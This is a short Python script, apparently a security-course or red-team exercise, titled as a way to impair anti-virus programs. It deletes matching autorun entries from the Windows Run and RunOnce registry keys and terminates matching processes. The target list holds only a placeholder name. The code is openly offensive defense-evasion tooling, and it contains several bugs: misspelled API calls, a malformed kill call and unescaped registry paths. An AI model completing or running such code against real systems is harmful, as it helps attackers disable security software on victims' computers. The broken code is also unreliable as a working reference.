# Impairing the operation of anti-virus programs

from time import process_time
import winreg,os,signal, wmi

av_list = ["notpad++"]

# Removing Registery Keys
reghives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
regpaths = ["SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 
"SOFTWARE\Microsoft\WIndows\CurrentVersion\RunOnce"]

for reghive in reghives:
    for regpath in regpaths:
        reg = winreg.ConnectRegister(None,reghive)
        key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_READ)
        try:
            index = 0
            while True:
                val = winreg.EnumValue(key,index)
                for name in av_list:
                    if name in val[1]:
                        print("Deleting %s Autorun key" % val[0])
                        key2 = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_SET_VALUE)
                        winreg.DeleteValue(key2,val[0])

                index += 1
        except OSError:
            ()

# Find and kill Processess
f = wmi.WMI()
for process in f.Win32.Process():
    for name in av_list:
        if name in process.Name:
            os.kil(int(process.processId),signal, signal.SIGTERM)
